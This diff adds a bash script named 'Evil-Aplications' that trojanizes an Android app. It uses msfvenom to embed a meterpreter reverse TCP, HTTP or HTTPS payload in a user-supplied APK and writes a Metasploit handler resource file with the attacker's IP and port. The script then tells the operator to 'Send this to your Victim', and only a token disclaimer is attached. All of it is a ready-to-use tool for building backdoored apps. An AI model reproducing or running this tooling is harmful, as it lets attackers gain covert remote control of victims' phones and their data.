@@ -1,0 +1,364 @@
+#!/bin/bash
+#Color
+Red='\033[0;31m'   #Red
+g='\033[0;32m'     #Green
+p='\033[0;35m'     #Purple
+BBlue='\033[1;34m' #Bold Blue
+none='\033[0m'     #none/no color
+BG='\033[1;32m'    #Bold Green
+BR='\033[1;31m'    #Bold Red 
+#checking if root!
+if [ "$EUID" -ne 0 ]
+  then 
+       printf "                                                       \n"
+       printf "${BG}**************************************${none}     \n"
+       printf "                                                       \n"
+       printf "  ${BR}Opps! Your not running as 'ROOT':(${none}       \n"
+       printf "                                                       \n"
+       printf "${BG}**************************************${none}     \n"
+       printf "                                                       \n"
+  exit
+fi
+
+#package checking!
+clear
+printf "${BR}NEED CLEANUP\n"
+sudo rm autometasploit.rc
+sudo rm infected.apk/Infected.apk
+sudo rm infected.apk/lastexecute.txt
+sleep 1
+printf "${BG}CLEANED\n"
+sleep 1
+clear
+./banner/evil.sh
+sleep 3
+echo "Checking for the Packages!"
+if ! command -v apktool &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install apktool
+fi
+
+if ! command -v apksigner &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt-get install apksigner
+fi
+
+if ! command -v zipalign &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install zipalign
+fi
+
+if ! command -v python &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install python
+fi
+
+if ! command -v python-pip &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install python-pip
+fi
+
+if ! command -v cowsay &> /dev/null
+then
+    echo "Tool is not installed, Trying to install Tools"
+    sudo apt install cowsay
+    pip install cowsay
+fi
+if ! command -v jarsigner &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install openjdk-11-jdk
+fi
+if ! command -v xterm &> /dev/null
+then
+    echo "Package is not installed, Trying to install Package!"
+    sudo apt install xterm
+fi
+clear
+sleep 1
+printf "\n${BG}APKTOOL...OK"
+sleep 1
+printf "\nAPKSIGNER...OK"
+sleep 1
+printf "\nZIPALIGN...OK"
+sleep 1
+printf "\nPYTHON...OK"
+sleep 1
+printf "\nPYTHON-PIP...OK"
+sleep 1
+printf "\nCOWSAY...OK"
+sleep 1
+printf "\nXTERM...OK"
+sleep 1
+printf "\nJARSIGNER...OK${none}"
+sleep 2
+printf "\n${BR}METASPLOIT-FRAMEWORK!!!${none}\n"
+echo ""
+sleep 3
+clear
+#Starting the point of script!
+cowsay "All package are installed"
+sleep 2
+clear
+printf "\n${BR}              Starting to make your payload!!!"
+printf "\nMake sure you application is located on 'original.apk' folder"
+printf "\nThe output will be located on the 'infected.apk'!!!${none}"
+sleep 10
+clear
+#making payload
+printf "\n${p}Starting apache2!"
+sudo service apache2 start
+sleep 2
+printf "\n${p}starting postgresql!${none}"
+sudo service postgresql start
+sleep 2
+clear
+printf  "\n${BBlue}Progress!${none}"
+sleep 3
+clear
+./banner/evil2.sh
+echo ""
+sleep 0.5
+printf "\n${Red}Make sure your Application are added to original.apk\n"
+sleep 1
+printf "infected.apk will be the output location file of your payload\n"
+sleep 1
+printf "Some of the application may be secured and not available to decompile\n"
+sleep 1
+printf "recomended Application are Release below 2017-2018\n${none}"
+sleep 1
+echo ""
+read -n 1 -s -r -p "Press any key to continue"
+echo ""
+printf "\n${BG}=============================================${none}\n"
+echo "Application name! 'With .apk'"
+read apk
+printf "\n${BG}OK${none}\n"
+printf "\n${BG}=============================================${none}\n"
+echo "Network Ip!"
+read ip
+printf "\n${BG}OK${none}\n"
+printf "\n${BG}=============================================${none}\n"
+echo "Port forwarding! ex.'4444' "
+read port
+printf "\n${BG}OK${none}\n"
+printf "\n${BG}=============================================${none}\n"
+printf "$p###################\n"
+printf "$BG Type of Payload:\n"
+printf "$p###################\n"
+echo ""
+printf "$p@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
+printf "$BR 1) 'android/meterpreter/reverse_tcp'\n"
+printf "$BR 2) 'android/meterpreter/reverse_http'\n"
+printf "$BR 3) 'android/meterpreter/reverse_https'\n"
+printf "$BR 4) 'Quit'                         $none\n"
+printf "$p@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n"
+printf "$BBlue'select: 1, 2, 3, and 4 to quit'$none\n"
+#Bash Menu Script Example
+PS3='Choose Your Payload type: '
+options=("1" "2" "3" "4")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "1")
+            printf "$BG android/meterpreter/reverse_tcp\n"
+            printf "\n${BG}=============================================${none}\n"
+            sleep 2
+            clear
+            printf "${BR}"
+            cowsay "Infecting Application!"
+            #sudo xterm -e /bin/msfvenom -x original.apk/$apk -p android/meterpreter/reverse_tcp lhost=$ip lport=$port -o infected.apk/Payload.apk
+            sudo xterm -e /bin/sudo msfvenom -x original.apk/$apk -p android/meterpreter/reverse_tcp lhost=$ip lport=$port -o infected.apk/Infected.apk
+            printf "\n${BG}OK${none}\n"
+            sleep 1
+            clear
+            printf "${BBlue}"
+            cowsay "Done Building App"
+            printf "${none}"
+            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            echo "use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost $ip
+set lport $port
+exploit" > autometasploit.rc
+            echo "type: android/meterpreter/reverse_tcp
+apk: $apk
+ip: $ip
+port: $port
+" > infected.apk/lastexecute.txt
+            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            sleep 2
+            echo ""
+            printf "\n${BR}Dont use for Ilegal Purpose!!!${none}\n"
+            sleep 5
+            clear
+            printf "${g}apache2 shutdown\n"
+            sudo service apache2 stop
+            clear
+            printf "postgresql shutdown\n"
+            sudo service postgresql stop
+            sleep 1
+            clear
+            break
+            ;;
+        "2")
+            printf "$BG android/meterpreter/reverse_http\n"
+            printf "\n${BG}=============================================${none}\n"
+            sleep 2
+            clear
+            printf "${BR}"
+            cowsay "Infecting Application!"
+            #sudo xterm -e /bin/msfvenom -x original.apk/$apk -p android/meterpreter/reverse_http lhost=$ip lport=$port -o infected.apk/Payload.apk
+            sudo xterm -e /bin/sudo msfvenom -x original.apk/$apk -p android/meterpreter/reverse_http lhost=$ip lport=$port -o infected.apk/Infected.apk
+            printf "\n${BG}OK${none}\n"
+            sleep 1
+            clear
+            printf "${BBlue}"
+            cowsay "Done Building App"
+            printf "${none}"
+            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            echo "use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost $ip
+set lport $port
+exploit" > autometasploit.rc
+            echo "type: android/meterpreter/reverse_http
+apk: $apk
+ip: $ip
+port: $port
+" > infected.apk/lastexecute.txt
+            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            sleep 2
+            echo ""
+            printf "\n${BR}Dont use for Ilegal Purpose!!!${none}\n"
+            sleep 5
+            clear
+            printf "${g}apache2 shutdown\n"
+            sudo service apache2 stop
+            clear
+            printf "postgresql shutdown\n"
+            sudo service postgresql stop
+            sleep 1
+            clear
+            break
+            ;;
+        "3")
+            printf "$BG android/meterpreter/reverse_https\n"
+            printf "\n${BG}=============================================${none}\n"
+            sleep 2
+            clear
+            printf "${BR}"
+            cowsay "Infecting Application!"
+            #sudo xterm -e /bin/msfvenom -x original.apk/$apk -p android/meterpreter/reverse_https lhost=$ip lport=$port -o infected.apk/Payload.apk
+            sudo xterm -e /bin/sudo msfvenom -x original.apk/$apk -p android/meterpreter/reverse_https lhost=$ip lport=$port -o infected.apk/Infected.apk
+            printf "\n${BG}OK${none}\n"
+            sleep 1
+            clear
+            printf "${BBlue}"
+            cowsay "Done Building App"
+            printf "${none}"
+            printf "\n${BR}#drag this file after openning 'Metasploit-Framework'${none}\n"
+            echo "use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost $ip
+set lport $port
+exploit" > autometasploit.rc
+            echo "type: android/meterpreter/reverse_https
+apk: $apk
+ip: $ip
+port: $port
+" > infected.apk/lastexecute.txt
+            printf "${p}After Openning Metasploit-Framework, type 'resourse ' and drag autometasploit.rc file${none}\n"
+            printf "\n${BG}Done Building App. Send this to your Victim!!!${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            printf "\n${BG}OK${none}"
+            sleep 2
+            echo ""
+            printf "\n${BR}Dont use for Ilegal Purpose!!!${none}\n"
+            sleep 5
+            clear
+            printf "${g}apache2 shutdown\n"
+            sudo service apache2 stop
+            clear
+            printf "postgresql shutdown\n"
+            sudo service postgresql stop
+            sleep 1
+            clear
+            break
+            ;;
+        "4")
+            ./banner/evil2.sh
+            printf "\n${BG}Thanks for using Evil-Aplications!!!${none}\n"
+            exit
+            ;;
+        *) echo "invalid option $REPLY";;
+    esac
+done
+# Finish!
+./banner/evil2.sh
+echo ""
+printf "\n${BG}Thanks for using Evil-Aplications!!!${none}\n"
+echo ""
+echo "Choose your option:"
+printf "${BG}M) Start Metasploit-FrameWork \n"
+printf "${BG}C) No. Just clean Everything! \n"
+printf "${BG}S) Start Evil Application again\n"
+printf "${BR}Q) Quit... \n" 
+printf "$p+=+=+=+=+=+=+=+=+=+=+=+=+=+=+${none}$BBlue\n"
+PS3='Select: '
+options=("m" "c" "s" "q")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "m")
+            printf "${BG}Starting Metasploit!!!"
+            msfconsole
+            break
+            ;;
+        "c")
+            printf "\n${BG}OK${none}"
+            printf "\n${BR}ERR${none}"
+            printf "\n${BG}OK${none}"
+            sleep 2
+            clear
+            ./banner/evil2.sh
+            printf "$BG Cleaning!!!\n"
+            printf "$BR Thank You!!!\n"
+            printf "\n${BR}Bye!!!${none}\n"
+            break
+            ;;
+        "s")
+            printf "${BG}Starting Evil-Application again!"
+            sleep 3
+            sudo ./evil
+            ;;
+        "q")
+            printf "\n${BG}OK${none}"
+            printf "\n${BR}ERR${none}"
+            printf "\n${BG}OK${none}"
+            sleep 3
+            clear
+            ./banner/evil2.sh
+            printf "$BG Cleaning!!!\n"
+            printf "$BR Thank You!!!\n"
+            printf "\n${BR}Bye!!!${none}\n"
+            break
+            ;;
+        *) echo "invalid option $REPLY";;
+    esac
+done
+exit
